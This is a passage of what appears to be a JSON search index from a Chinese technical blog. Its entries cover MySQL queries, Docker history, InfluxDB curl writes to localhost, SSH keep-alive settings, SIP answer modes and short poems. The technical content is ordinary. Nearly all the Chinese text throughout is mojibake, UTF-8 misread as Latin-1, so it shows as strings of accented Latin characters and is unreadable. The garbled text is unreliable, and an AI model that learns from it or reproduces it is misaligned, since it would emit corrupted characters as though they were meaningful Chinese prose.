ä¸è¦å¤§æ®µé‡æ„ï¼Œè¦å°æ­¥æ…¢èµ°ã€‚å°½é‡å‡å°‘å‘ç”Ÿé—®é¢˜çš„ç‚¹ã€‚åœ¨ä¸€æœ¬ä¹¦ä¸­æ‰¾é”™åˆ«å­—å¾ˆéš¾ï¼Œä½†æ˜¯åœ¨ä¸€è¡Œæ–‡å­—ä¸­æ‰¾é”™åˆ«å­—å°±éå¸¸å®¹æ˜“äº†ã€‚\nå‹¿çŒœæµ‹ å½“ä½ ä¸çŸ¥é“æŸä¸ªå‡½æ•°å¦‚ä½•ä½¿ç”¨æ—¶ï¼Œä¸è¦å»çŒœæµ‹ï¼Œè€Œåº”è¯¥å»çœ‹å®˜æ–¹æ–‡æ¡£æ˜¯å¦‚ä½•è®²è§£è¿™ä¸ªå‡½æ•°çš„ã€‚","title":"å¦‚ä½•é¢å¯¹æœªçŸ¥çš„é¡¹ç›®"},{"content":"ä¸€ä¸ªäººå–ç²¥å¤ªæ·¡ï¼Œä¸¤ä¸ªäººç”µè¯ç²¥å¤ªç”œã€‚å›å¿†ä¼¼æ°´æµå¹´ï¼Œç¿˜é¦–å¦‚èŠ±ç¾çœ·ã€‚å¯¹ç€å¾®ä¿¡èŠå¤©ï¼Œå‡Œæ™¨äº†ä¹Ÿæ²¡æœ‰è§‰å¾—æ™šã€‚çª—å¤–çš„æœˆäº®å¾ˆåœ†ï¼Œå°±åƒä½ é‚£åŒæ˜äº®çš„çœ¼ã€‚è¯´ä¸€å£°æ™šå®‰ï¼Œé“ä¸€å£°å†è§ï¼Œæˆ‘çš„æ¢¦ä¸­æ˜¯æœ‰ä½ çš„æ˜¥å¤©ã€‚\n","permalink":"https://wdd.js.org/posts/2019/10/an4am1/","summary":"ä¸€ä¸ªäººå–ç²¥å¤ªæ·¡ï¼Œä¸¤ä¸ªäººç”µè¯ç²¥å¤ªç”œã€‚å›å¿†ä¼¼æ°´æµå¹´ï¼Œç¿˜é¦–å¦‚èŠ±ç¾çœ·ã€‚å¯¹ç€å¾®ä¿¡èŠå¤©ï¼Œå‡Œæ™¨äº†ä¹Ÿæ²¡æœ‰è§‰å¾—æ™šã€‚çª—å¤–çš„æœˆäº®å¾ˆåœ†ï¼Œå°±åƒä½ é‚£åŒæ˜äº®çš„çœ¼ã€‚è¯´ä¸€å£°æ™šå®‰ï¼Œé“ä¸€å£°å†è§ï¼Œæˆ‘çš„æ¢¦ä¸­æ˜¯æœ‰ä½ çš„æ˜¥å¤©ã€‚","title":"ä¸€ä¸ªäººå–ç²¥å¤ªæ·¡"},{"content":"ä½ æœ‰é‚®ç®±å—ï¼Ÿå¦‚æœä½ æœ‰çš„è¯ï¼Œé‚£ä¹ˆå½“æˆ‘ä¸åœ¨ä½ èº«è¾¹çš„æ—¶å€™ï¼Œæˆ‘ä¼šæ¯å¤©ç»™ä½ å†™ä¸€å°ä¿¡ï¼Œå‘Šè¯‰ä½ ï¼Œæˆ‘ä»Šå¤©é‡è§çš„çš„äººï¼Œå‘Šè¯‰ä½ ï¼Œæˆ‘èº«è¾¹å‘ç”Ÿçš„äº‹ï¼Œå‘Šè¯‰ä½ ï¼Œå½“ä½ ä¸åœ¨æˆ‘èº«è¾¹æ—¶ï¼Œæˆ‘æœ‰å¤šæƒ³ä½ \n","permalink":"https://wdd.js.org/posts/2019/10/tgn9th/","summary":"ä½ æœ‰é‚®ç®±å—ï¼Ÿå¦‚æœä½ æœ‰çš„è¯ï¼Œé‚£ä¹ˆå½“æˆ‘ä¸åœ¨ä½ èº«è¾¹çš„æ—¶å€™ï¼Œæˆ‘ä¼šæ¯å¤©ç»™ä½ å†™ä¸€å°ä¿¡ï¼Œå‘Šè¯‰ä½ ï¼Œæˆ‘ä»Šå¤©é‡è§çš„çš„äººï¼Œå‘Šè¯‰ä½ ï¼Œæˆ‘èº«è¾¹å‘ç”Ÿçš„äº‹ï¼Œå‘Šè¯‰ä½ ï¼Œå½“ä½ ä¸åœ¨æˆ‘èº«è¾¹æ—¶ï¼Œæˆ‘æœ‰å¤šæƒ³ä½ ","title":"ä½ æœ‰é‚®ç®±å—ï¼Ÿ"},{"content":"è¡¨å¤åˆ¶ # ä¸è·¨æ•°æ®åº“ insert into subscriber_copy(id, username) select id, username from subscriber # è·¨æ•°æ®åº“ éœ€è¦åœ¨è¡¨åå‰åŠ ä¸Šæ•°æ®åº“å insert into wdd.test(id, username) select id, username from opensips.subscriber è°ƒæ•´è¡¨ç»“æ„ å¢åŠ å­—æ®µ ALTER TABLE test ADD `username` char(64) not null default \u0026#39;\u0026#39; ","permalink":"https://wdd.js.org/posts/2019/10/nhrhfr/","summary":"è¡¨å¤åˆ¶ # ä¸è·¨æ•°æ®åº“ insert into subscriber_copy(id, username) select id, username from subscriber # è·¨æ•°æ®åº“ éœ€è¦åœ¨è¡¨åå‰åŠ ä¸Šæ•°æ®åº“å insert into wdd.test(id, username) select id, username from opensips.subscriber è°ƒæ•´è¡¨ç»“æ„ å¢åŠ å­—æ®µ ALTER TABLE test ADD `username` char(64) not null default \u0026#39;\u0026#39; ","title":"MySqlè¡¨å¤åˆ¶ ä¸ è°ƒæ•´å­—æ®µ"},{"content":"è¡¨wdd_a è¡¨wdd_b\nä¸ä½¿ç”¨whereå­å¥ç”Ÿæˆçš„è¡¨çš„æ•°æ˜¯ä¸¤ä¸ªè¡¨è¡Œæ•°çš„ç§¯ï¼Œå…¶å­—æ®µçš„å­—æ®µä¸¤ä¸ªè¡¨çš„æ‹¼æ¥\næŸ¥è¯¢çš„è¡Œæ•° = è¡¨açš„è¡Œæ•° x è¡¨bçš„è¡Œæ•°\nSELECT * FROM `wdd_a` join `wdd_b` order by wdd_a.id è¡¨è”åˆä¸ä½¿ç”¨whereå­å¥ï¼Œä¼šå­˜åœ¨ä¸¤ä¸ªé—®é¢˜\næŸ¥è¯¢å‡ºæ¥çš„ç»“æœæ²¡æœ‰æ„ä¹‰ äº§ç”Ÿå¤§é‡çš„æ— ç”¨æ•°æ®ï¼Œä¾‹å¦‚1000è¡Œçš„è¡¨aè”åˆ1000è¡Œçš„è¡¨bï¼Œå°†ä¼šäº§ç”Ÿ1000*1000è¡Œçš„ç»“æœ SELECT * FROM `wdd_a` join `wdd_b` where wdd_a.id = wdd_b.id å½“ä½¿ç”¨è¡¨è”åˆä¹‹åï¼Œäº§ç”Ÿçš„æ•°æ®\næ˜¯æœ‰æ„ä¹‰çš„ æŸ¥è¯¢ç»“æœçš„è¡Œæ•°ä¸€å®šæ¯”ä¸¤å¼ è¡¨çš„è¡Œæ•°éƒ½è¦å°‘ ä¸‹é¢æ˜¯ä¸€ä¸ªå¤æ‚çš„ä¾‹å­ï¼Œç»™è¡¨èµ·äº†åˆ«åï¼Œå¦å¤–ä¹ŸåªæŠ½å–äº†éƒ¨åˆ†å­—æ®µ\nSELECT `a`.`id` AS `id`, `a`.`caller_id_dpid` AS `caller_id_dpid`, `a`.`callee_id_dpid` AS `callee_id_dpid`, `a`.`trunk_group` AS `trunk_group`, `b`.`domain` AS `domain` FROM (`wj_route_group` `a` join `domain` `b`) where (`a`.`id` = `b`.`route_group_id`); ","permalink":"https://wdd.js.org/posts/2019/10/gdeknt/","summary":"è¡¨wdd_a è¡¨wdd_b\nä¸ä½¿ç”¨whereå­å¥ç”Ÿæˆçš„è¡¨çš„æ•°æ˜¯ä¸¤ä¸ªè¡¨è¡Œæ•°çš„ç§¯ï¼Œå…¶å­—æ®µçš„å­—æ®µä¸¤ä¸ªè¡¨çš„æ‹¼æ¥\næŸ¥è¯¢çš„è¡Œæ•° = è¡¨açš„è¡Œæ•° x è¡¨bçš„è¡Œæ•°\nSELECT * FROM `wdd_a` join `wdd_b` order by wdd_a.id è¡¨è”åˆä¸ä½¿ç”¨whereå­å¥ï¼Œä¼šå­˜åœ¨ä¸¤ä¸ªé—®é¢˜\næŸ¥è¯¢å‡ºæ¥çš„ç»“æœæ²¡æœ‰æ„ä¹‰ äº§ç”Ÿå¤§é‡çš„æ— ç”¨æ•°æ®ï¼Œä¾‹å¦‚1000è¡Œçš„è¡¨aè”åˆ1000è¡Œçš„è¡¨bï¼Œå°†ä¼šäº§ç”Ÿ1000*1000è¡Œçš„ç»“æœ SELECT * FROM `wdd_a` join `wdd_b` where wdd_a.id = wdd_b.id å½“ä½¿ç”¨è¡¨è”åˆä¹‹åï¼Œäº§ç”Ÿçš„æ•°æ®\næ˜¯æœ‰æ„ä¹‰çš„ æŸ¥è¯¢ç»“æœçš„è¡Œæ•°ä¸€å®šæ¯”ä¸¤å¼ è¡¨çš„è¡Œæ•°éƒ½è¦å°‘ ä¸‹é¢æ˜¯ä¸€ä¸ªå¤æ‚çš„ä¾‹å­ï¼Œç»™è¡¨èµ·äº†åˆ«åï¼Œå¦å¤–ä¹ŸåªæŠ½å–äº†éƒ¨åˆ†å­—æ®µ\nSELECT `a`.`id` AS `id`, `a`.`caller_id_dpid` AS `caller_id_dpid`, `a`.`callee_id_dpid` AS `callee_id_dpid`, `a`.`trunk_group` AS `trunk_group`, `b`.`domain` AS `domain` FROM (`wj_route_group` `a` join `domain` `b`) where (`a`.`id` = `b`.`route_group_id`); ","title":"ç†è§£mysql è¡¨è¿æ¥"},{"content":"ä½ ä½•æ—¶ç»“å©šÂ ç©çº¸ç‰Œè€… æ¢¦ é²å°”å¤«äººçš„è‚–åƒ å‘å–Š è£¸ä½“ ç»¿å¶ åŠèº«åƒ åŠ æ­‡åŒ»ç”Ÿ æ‹¿çƒŸæ–—çš„ç”·å­© è€å‰ä»–æ‰‹ çº¢é»„è“çš„æ„æˆIIÂ è’™å¾·é‡Œå®‰ é•œå‰å°‘å¥³ ç¥å¥ˆå·å†²æµª ","permalink":"https://wdd.js.org/posts/2019/10/cgr19x/","summary":"ä½ ä½•æ—¶ç»“å©šÂ ç©çº¸ç‰Œè€… æ¢¦ é²å°”å¤«äººçš„è‚–åƒ å‘å–Š è£¸ä½“ ç»¿å¶ åŠèº«åƒ åŠ æ­‡åŒ»ç”Ÿ æ‹¿çƒŸæ–—çš„ç”·å­© è€å‰ä»–æ‰‹ çº¢é»„è“çš„æ„æˆIIÂ è’™å¾·é‡Œå®‰ é•œå‰å°‘å¥³ ç¥å¥ˆå·å†²æµª ","title":"ä¸–ç•Œåç”»"},{"content":"åˆ€è€•ç«ç§ï¼šæ²¡æœ‰dockerçš„æ—¶ä»£ æƒ³æƒ³å“ªäº›æ²¡æœ‰dockeræ—¶å…‰, æˆ‘ä»¬æ˜¯æ€ä¹ˆç©linuxçš„ã€‚\né¦–å…ˆä½ è¦å…ˆè£…ä¸€ä¸ªvmwareæˆ–è€…virtualbox, ç„¶åå†ä¸‹è½½ä¸€ä¸ªå‡ ä¸ªGBçš„ISOæ–‡ä»¶ï¼Œç„¶åä¸€æ­¥ä¸¤æ­¥ä¸‰æ­¥çš„ç»è¿‡åå‡ ä¸ªæ­¥éª¤ï¼Œç»ˆäºè£…å¥½äº†ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¿™å…¶ä¸­çš„æ­¥éª¤ï¼Œæ¯ä¸€æ­¥éƒ½å¯èƒ½æœ‰å‡ ä¸ªå‘åœ¨ç­‰ä½ è¸©ã€‚\nå…­å¹´å‰ï¼Œä¹Ÿå°±æ˜¯åœ¨2013çš„æ—¶å€™ï¼Œdockerå‡ºç°äº†ï¼Œè¿™ä¸ªæ–°å¥‡çš„ä¸œè¥¿ï¼Œå¯ä»¥è®©ä½ ç”¨ä¸€è¡Œå‘½ä»¤è¿è¡Œä¸€ä¸ªå„ç§linuxçš„å‘è¡Œç‰ˆã€‚\ndocker run -it centos docker run -it debian é»‘è‰²è£‚å˜ï¼šdockeræ—¶ä»£ docker å®˜ç½‘ä¸Šï¼Œæœ‰ä¸ªå¯¹dockeréå¸¸å‡†ç¡®çš„å®šä½ï¼š\nDocker: The Modern Platform for High-Velocity Innovation\næˆ‘è§‰å¾—è¡Œè‹±æ–‡å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ä¸å¥½ç¿»è¯‘ï¼Œä»ä¸­æŠ½å–ä¸‰ä¸ªä¸€ä¸ªæœ€ç»ˆè¦çš„å…³é”®è¯ã€‚\u0026ldquo;High-Velocty\u0026rdquo;ï¼Œå¯ä»¥ç†è§£ä¸ºåŠ é€Ÿï¼Œæé€Ÿã€‚\né‚£ä¹ˆdockerè®©devopsæé€Ÿäº†å¤šå°‘å‘¢ï¼Ÿ\næ²¡æœ‰dockerçš„æ—¶ä»£ï¼Œå¦‚æœå¯ä»¥ç§°ä¸ºå†·å…µå™¨æ—¶ä»£çš„è¯ï¼Œdockerçš„å‡ºç°ï¼Œå°†devopså¸¦å…¥äº†çƒ­å…µå™¨æ—¶ä»£ã€‚\næˆ‘ä»¬ä¸ç”¨å†å‡†å¤‡çŸ³å¤´ï¼Œæœ¨æ£ï¼Œä¸éœ€è¦æ‰“ç£¨å…µå™¨ï¼Œæˆ‘ä»¬å”¯ä¸€è¦åšçš„äº‹æƒ…ï¼Œç„å‡†ç›®æ ‡ï¼Œæ‰£åŠ¨æ‰³æœºã€‚\nè¿ç­¹å¸·å¹„ï¼šk8sæ—¶ä»£ è¯´å®åœ¨çš„ï¼Œæˆ‘è¿˜æ²¡ä»”ç»†å»ä½“å‘³dockerçš„æ—¶ä»£æ—¶ï¼Œå°±å·²ç»è¿›å…¥äº†k8sæ—¶ä»£ã€‚k8sçš„å‡ºç°ï¼Œè®©æˆ‘ä»¬å¯ä»¥ä¸ç”¨ç®¡docker, å¯ä»¥ç›´æ¥è·³è¿‡docker, ç›´æ¥å­¦ä¹ k8sçš„æ¦‚å¿µä¸å‘½ä»¤ã€‚\nk8sçš„å¥½å¤„å°±ä¸å†å¤šå°‘äº†ï¼Œåªè¯´è¯´å®ƒçš„ç¼ºç‚¹ã€‚\nèµ„æºæ¶ˆè€—å¤§ï¼šk8så•æœºç‰ˆæ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä¸€èˆ¬éƒ½æ˜¯é›†ç¾¤ï¼Œä½ éœ€è¦å¤šå°è™šæ‹Ÿæœº éƒ¨ç½²è€—è´¹ç²¾åŠ›ï¼šæƒ³è¦éƒ¨ç½²k8sï¼Œè¦éƒ¨ç½²å‡ ä¸ªé…å¥—çš„åŸºç¡€æœåŠ¡ k8så¯¹äºtcpæœåŠ¡æ”¯æŒå¾ˆå¥½ï¼Œå¯¹äºudpæœåŠ¡ï¼Œ æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯éœ€è¦ä¸€ä¸ªç¯å¢ƒï¼Œè·‘è·‘è‡ªå·±çš„ä»£ç ï¼Œç›¸æ¯”äºk8sï¼Œdockeræ— ç–‘æ˜¯æœ€æ–¹ä¾¿ä¸”ä¾¿å®œçš„é€‰æ‹©ã€‚\nè¯´å®åœ¨çš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´å¯¹dockeræ²¡æœ‰å…¨é¢çš„æŒæ¡ï¼Œç³»ç»Ÿçš„å­¦ä¹ ï¼Œæˆ‘å°†ä¼šåœ¨è¿™ä¸ªçŸ¥è¯†åº“é‡Œï¼Œç³»ç»Ÿçš„æ¢³ç†dockerç›¸å…³çš„çŸ¥è¯†å’Œå®æˆ˜ç»éªŒã€‚\nå¸å›½çƒ½çƒŸï¼šäº‘åŸç”Ÿæ—¶ä»£ å¾®æœåŠ¡ åº”ç”¨ç¼–æ’è°ƒåº¦ å®¹å™¨åŒ– é¢å‘API å‚è€ƒ https://en.wikipedia.org/wiki/Docker,_Inc. https://thenewstack.io/10-key-attributes-of-cloud-native-applications/ https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html https://www.redhat.com/en/topics/cloud-native-apps ","permalink":"https://wdd.js.org/posts/2019/10/nzpt8a/","summary":"åˆ€è€•ç«ç§ï¼šæ²¡æœ‰dockerçš„æ—¶ä»£ æƒ³æƒ³å“ªäº›æ²¡æœ‰dockeræ—¶å…‰, æˆ‘ä»¬æ˜¯æ€ä¹ˆç©linuxçš„ã€‚\né¦–å…ˆä½ è¦å…ˆè£…ä¸€ä¸ªvmwareæˆ–è€…virtualbox, ç„¶åå†ä¸‹è½½ä¸€ä¸ªå‡ ä¸ªGBçš„ISOæ–‡ä»¶ï¼Œç„¶åä¸€æ­¥ä¸¤æ­¥ä¸‰æ­¥çš„ç»è¿‡åå‡ ä¸ªæ­¥éª¤ï¼Œç»ˆäºè£…å¥½äº†ä¸€ä¸ªè™šæ‹Ÿæœºã€‚è¿™å…¶ä¸­çš„æ­¥éª¤ï¼Œæ¯ä¸€æ­¥éƒ½å¯èƒ½æœ‰å‡ ä¸ªå‘åœ¨ç­‰ä½ è¸©ã€‚\nå…­å¹´å‰ï¼Œä¹Ÿå°±æ˜¯åœ¨2013çš„æ—¶å€™ï¼Œdockerå‡ºç°äº†ï¼Œè¿™ä¸ªæ–°å¥‡çš„ä¸œè¥¿ï¼Œå¯ä»¥è®©ä½ ç”¨ä¸€è¡Œå‘½ä»¤è¿è¡Œä¸€ä¸ªå„ç§linuxçš„å‘è¡Œç‰ˆã€‚\ndocker run -it centos docker run -it debian é»‘è‰²è£‚å˜ï¼šdockeræ—¶ä»£ docker å®˜ç½‘ä¸Šï¼Œæœ‰ä¸ªå¯¹dockeréå¸¸å‡†ç¡®çš„å®šä½ï¼š\nDocker: The Modern Platform for High-Velocity Innovation\næˆ‘è§‰å¾—è¡Œè‹±æ–‡å¾ˆå¥½ç†è§£ï¼Œä½†æ˜¯ä¸å¥½ç¿»è¯‘ï¼Œä»ä¸­æŠ½å–ä¸‰ä¸ªä¸€ä¸ªæœ€ç»ˆè¦çš„å…³é”®è¯ã€‚\u0026ldquo;High-Velocty\u0026rdquo;ï¼Œå¯ä»¥ç†è§£ä¸ºåŠ é€Ÿï¼Œæé€Ÿã€‚\né‚£ä¹ˆdockerè®©devopsæé€Ÿäº†å¤šå°‘å‘¢ï¼Ÿ\næ²¡æœ‰dockerçš„æ—¶ä»£ï¼Œå¦‚æœå¯ä»¥ç§°ä¸ºå†·å…µå™¨æ—¶ä»£çš„è¯ï¼Œdockerçš„å‡ºç°ï¼Œå°†devopså¸¦å…¥äº†çƒ­å…µå™¨æ—¶ä»£ã€‚\næˆ‘ä»¬ä¸ç”¨å†å‡†å¤‡çŸ³å¤´ï¼Œæœ¨æ£ï¼Œä¸éœ€è¦æ‰“ç£¨å…µå™¨ï¼Œæˆ‘ä»¬å”¯ä¸€è¦åšçš„äº‹æƒ…ï¼Œç„å‡†ç›®æ ‡ï¼Œæ‰£åŠ¨æ‰³æœºã€‚\nè¿ç­¹å¸·å¹„ï¼šk8sæ—¶ä»£ è¯´å®åœ¨çš„ï¼Œæˆ‘è¿˜æ²¡ä»”ç»†å»ä½“å‘³dockerçš„æ—¶ä»£æ—¶ï¼Œå°±å·²ç»è¿›å…¥äº†k8sæ—¶ä»£ã€‚k8sçš„å‡ºç°ï¼Œè®©æˆ‘ä»¬å¯ä»¥ä¸ç”¨ç®¡docker, å¯ä»¥ç›´æ¥è·³è¿‡docker, ç›´æ¥å­¦ä¹ k8sçš„æ¦‚å¿µä¸å‘½ä»¤ã€‚\nk8sçš„å¥½å¤„å°±ä¸å†å¤šå°‘äº†ï¼Œåªè¯´è¯´å®ƒçš„ç¼ºç‚¹ã€‚\nèµ„æºæ¶ˆè€—å¤§ï¼šk8så•æœºç‰ˆæ²¡ä»€ä¹ˆæ„ä¹‰ï¼Œä¸€èˆ¬éƒ½æ˜¯é›†ç¾¤ï¼Œä½ éœ€è¦å¤šå°è™šæ‹Ÿæœº éƒ¨ç½²è€—è´¹ç²¾åŠ›ï¼šæƒ³è¦éƒ¨ç½²k8sï¼Œè¦éƒ¨ç½²å‡ ä¸ªé…å¥—çš„åŸºç¡€æœåŠ¡ k8så¯¹äºtcpæœåŠ¡æ”¯æŒå¾ˆå¥½ï¼Œå¯¹äºudpæœåŠ¡ï¼Œ æ‰€ä»¥å¦‚æœæˆ‘ä»¬ä»…ä»…æ˜¯éœ€è¦ä¸€ä¸ªç¯å¢ƒï¼Œè·‘è·‘è‡ªå·±çš„ä»£ç ï¼Œç›¸æ¯”äºk8sï¼Œdockeræ— ç–‘æ˜¯æœ€æ–¹ä¾¿ä¸”ä¾¿å®œçš„é€‰æ‹©ã€‚\nè¯´å®åœ¨çš„ï¼Œæˆ‘ä¹‹å‰ä¸€ç›´å¯¹dockeræ²¡æœ‰å…¨é¢çš„æŒæ¡ï¼Œç³»ç»Ÿçš„å­¦ä¹ ï¼Œæˆ‘å°†ä¼šåœ¨è¿™ä¸ªçŸ¥è¯†åº“é‡Œï¼Œç³»ç»Ÿçš„æ¢³ç†dockerç›¸å…³çš„çŸ¥è¯†å’Œå®æˆ˜ç»éªŒã€‚\nå¸å›½çƒ½çƒŸï¼šäº‘åŸç”Ÿæ—¶ä»£ å¾®æœåŠ¡ åº”ç”¨ç¼–æ’è°ƒåº¦ å®¹å™¨åŒ– é¢å‘API å‚è€ƒ https://en.wikipedia.org/wiki/Docker,_Inc. https://thenewstack.io/10-key-attributes-of-cloud-native-applications/ https://jimmysong.io/kubernetes-handbook/cloud-native/cloud-native-definition.html https://www.redhat.com/en/topics/cloud-native-apps ","title":"è™šæ‹ŸåŒ–æµªæ½®"},{"content":"åˆ›å»ºæ•°æ®åº“ curl -i -XPOST http://localhost:8086/query --data-urlencode \u0026#34;q=CREATE DATABASE testdb\u0026#34; å†™æ•°æ®åˆ°æ•°æ®åº“ curl -i -XPOST \u0026#39;http://localhost:8086/write?db=mydb\u0026#39; --data-binary \u0026#39;cpu_load_short,host=server01,region=us-west value=0.64 1434055562000000000\u0026#39; æ‰¹é‡å†™å…¥ output.txt\nnginx_second,tag=ip169 value=21 1592638800000000000 nginx_second,tag=ip169 value=32 1592638801000000000 nginx_second,tag=ip169 value=20 1592638802000000000 nginx_second,tag=ip169 value=11 1592638803000000000 curl -i -XPOST \u0026#39;http://localhost:8086/write?db=mydb\u0026#39; --data-binary @output.txt å‚è€ƒ https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/ ","permalink":"https://wdd.js.org/posts/2019/10/eqgykt/","summary":"åˆ›å»ºæ•°æ®åº“ curl -i -XPOST http://localhost:8086/query --data-urlencode \u0026#34;q=CREATE DATABASE testdb\u0026#34; å†™æ•°æ®åˆ°æ•°æ®åº“ curl -i -XPOST \u0026#39;http://localhost:8086/write?db=mydb\u0026#39; --data-binary \u0026#39;cpu_load_short,host=server01,region=us-west value=0.64 1434055562000000000\u0026#39; æ‰¹é‡å†™å…¥ output.txt\nnginx_second,tag=ip169 value=21 1592638800000000000 nginx_second,tag=ip169 value=32 1592638801000000000 nginx_second,tag=ip169 value=20 1592638802000000000 nginx_second,tag=ip169 value=11 1592638803000000000 curl -i -XPOST \u0026#39;http://localhost:8086/write?db=mydb\u0026#39; --data-binary @output.txt å‚è€ƒ https://docs.influxdata.com/influxdb/v1.7/guides/writing_data/ ","title":"influxdb httpæ“ä½œ"},{"content":"ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ ~/.ssh/config åœ¨é¡¶éƒ¨æ·»åŠ ä¸‹è¾¹ä¸¤è¡Œ Host * ServerAliveInterval=30 æ¯éš”30ç§’å‘æœåŠ¡ç«¯å‘é€ no-opåŒ…\n","permalink":"https://wdd.js.org/posts/2019/10/swoxa5/","summary":"ç¼–è¾‘è¿™ä¸ªæ–‡ä»¶ ~/.ssh/config åœ¨é¡¶éƒ¨æ·»åŠ ä¸‹è¾¹ä¸¤è¡Œ Host * ServerAliveInterval=30 æ¯éš”30ç§’å‘æœåŠ¡ç«¯å‘é€ no-opåŒ…","title":"sshä¿æŒè¿æ¥çŠ¶æ€ä¸æ–­å¼€"},{"content":"Notify ä½¿ç”¨noifyæ¶ˆæ¯ï¼Œé€šçŸ¥åˆ†æœºåº”ç­”ï¼Œè¿™ä¸ªnotifyä¸€èˆ¬å‘é€åœ¨åˆ†æœºå›180å“åº”ä¹‹å\nAnswer-mode Answer-Modeä¸€èˆ¬æœ‰ä¸¤ä¸ªå€¼ Auto: UAæ”¶åˆ°INVITEä¹‹åï¼Œç«‹å³å›200OKï¼Œæ²¡æœ‰180çš„è¿‡ç¨‹ Manual: UAæ”¶åˆ°INVITEä¹‹åï¼Œç­‰å¾…ç”¨æˆ·æ‰‹å·¥ç‚¹å‡»åº”ç­” é€šå¸¸Answer-Modeè¿˜ä¼šè·Ÿç€require, è¡¨ç¤ºæŸä¸ªåº”ç­”æ–¹å¼å¦‚æœä¸è¢«å…è®¸ï¼Œåº”å½“å›403 Forbidden ä½œä¸ºå“åº”ã€‚\nAnswer-Mode: Auto;require å’ŒAnswer-modeå¤´ç±»ä¼¼çš„æœ‰ä¸ªSIPå¤´å«åšï¼šPriv-Answer-Modeï¼Œè¿™ä¸ªåŠŸèƒ½å’ŒAnswer-Modeç±»ä¼¼ï¼Œä½†æ˜¯ä»–æœ‰ä¸ªç‰¹ç‚¹ã€‚\nå¦‚æœUAè®¾ç½®äº†å…æ‰“æ‰°ï¼ŒPriv-Answer-Modeå¤´ä¼šæ— è§†å…æ‰“æ‰°è¿™ä¸ªé€‰é¡¹ï¼Œå¼ºåˆ¶è®©åˆ†æœºåº”ç­”ï¼Œè¿™ä¸ªå¤´é€‚åˆç”¨äºç´§æ€¥å‘¼å«ã€‚\nç»“è®º å¦‚æœè¦å®ç°åˆ†æœºçš„è‡ªåŠ¨åº”ç­”ï¼Œæ˜¾ç„¶Answer-Modeçš„åº”ç­”é€Ÿåº¦å›æ›´å¿«ã€‚ä½†æ˜¯å¯¹äºä¾èµ–180å“åº”çš„ç³»ç»Ÿï¼Œå¯èƒ½è¦è€ƒè™‘è¿™ç§æ²¡æœ‰180ç›¸åº”çš„æƒ…å†µã€‚\nè¦è®°ä½ï¼Œåœ¨SIPæ¶ˆæ¯é‡Œï¼Œå¯¹äºUAæ¥è¯´ï¼Œ1xxçš„å“åº”éƒ½æ˜¯ä¸å¿…é¡»çš„å¯ä»¥ç¼ºå°‘çš„ã€‚\n","permalink":"https://wdd.js.org/opensips/ch1/ua-answer-mode/","summary":"Notify ä½¿ç”¨noifyæ¶ˆæ¯ï¼Œé€šçŸ¥åˆ†æœºåº”ç­”ï¼Œè¿™ä¸ªnotifyä¸€èˆ¬å‘é€åœ¨åˆ†æœºå›180å“åº”ä¹‹å\nAnswer-mode Answer-Modeä¸€èˆ¬æœ‰ä¸¤ä¸ªå€¼ Auto: UAæ”¶åˆ°INVITEä¹‹åï¼Œç«‹å³å›200OKï¼Œæ²¡æœ‰180çš„è¿‡ç¨‹ Manual: UAæ”¶åˆ°INVITEä¹‹åï¼Œç­‰å¾…ç”¨æˆ·æ‰‹å·¥ç‚¹å‡»åº”ç­” é€šå¸¸Answer-Modeè¿˜ä¼šè·Ÿç€require, è¡¨ç¤ºæŸä¸ªåº”ç­”æ–¹å¼å¦‚æœä¸è¢«å…è®¸ï¼Œåº”å½“å›403 Forbidden ä½œä¸ºå“åº”ã€‚\nAnswer-Mode: Auto;require å’ŒAnswer-modeå¤´ç±»ä¼¼çš„æœ‰ä¸ªSIPå¤´å«åšï¼šPriv-Answer-Modeï¼Œè¿™ä¸ªåŠŸèƒ½å’ŒAnswer-Modeç±»ä¼¼ï¼Œä½†æ˜¯ä»–æœ‰ä¸ªç‰¹ç‚¹ã€‚\nå¦‚æœUAè®¾ç½®äº†å…æ‰“æ‰°ï¼ŒPriv-Answer-Modeå¤´ä¼šæ— è§†å…æ‰“æ‰°è¿™ä¸ªé€‰é¡¹ï¼Œå¼ºåˆ¶è®©åˆ†æœºåº”ç­”ï¼Œè¿™ä¸ªå¤´é€‚åˆç”¨äºç´§æ€¥å‘¼å«ã€‚\nç»“è®º å¦‚æœè¦å®ç°åˆ†æœºçš„è‡ªåŠ¨åº”ç­”ï¼Œæ˜¾ç„¶Answer-Modeçš„åº”ç­”é€Ÿåº¦å›æ›´å¿«ã€‚ä½†æ˜¯å¯¹äºä¾èµ–180å“åº”çš„ç³»ç»Ÿï¼Œå¯èƒ½è¦è€ƒè™‘è¿™ç§æ²¡æœ‰180ç›¸åº”çš„æƒ…å†µã€‚\nè¦è®°ä½ï¼Œåœ¨SIPæ¶ˆæ¯é‡Œï¼Œå¯¹äºUAæ¥è¯´ï¼Œ1xxçš„å“åº”éƒ½æ˜¯ä¸å¿…é¡»çš„å¯ä»¥ç¼ºå°‘çš„ã€‚","title":"UAåº”ç­”æ¨¡å¼çš„å®ç°"},{"content":"å‰äº›å¤©ï¼Œæœ‰æœ‹å‹æ¨èä¸€éƒ¨ç¾å‰§ã€Šè‡´å‘½å¥³äººã€‹ï¼Œå¬ç€åå­—ï¼Œè§‰å¾—æœ‰ç‚¹åƒç‰¹å·¥æˆ–è€…çŠ¯ç½ªç³»åˆ—çš„ç”µè§†å‰§ã€‚\nçœ‹äº†å‰ç¬¬ä¸€é›†ä¹‹åï¼Œæ‰å‘ç°è¿™ä¸ªå‰§æ˜¯è®²è¿°å…³äºå©šå§»æ–¹é¢é—®é¢˜ç¾å‰§ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä¸å–œæ¬¢çœ‹å©šå§»é¢˜æçš„å½±è§†ã€‚ä½†æ˜¯ï¼Œä»»ä½•äº‹æƒ…éƒ½é€ƒä¸è¿‡çœŸç›¸å®šå¾‹ã€‚\n","permalink":"https://wdd.js.org/posts/2019/09/zgwg91/","summary":"å‰äº›å¤©ï¼Œæœ‰æœ‹å‹æ¨èä¸€éƒ¨ç¾å‰§ã€Šè‡´å‘½å¥³äººã€‹ï¼Œå¬ç€åå­—ï¼Œè§‰å¾—æœ‰ç‚¹åƒç‰¹å·¥æˆ–è€…çŠ¯ç½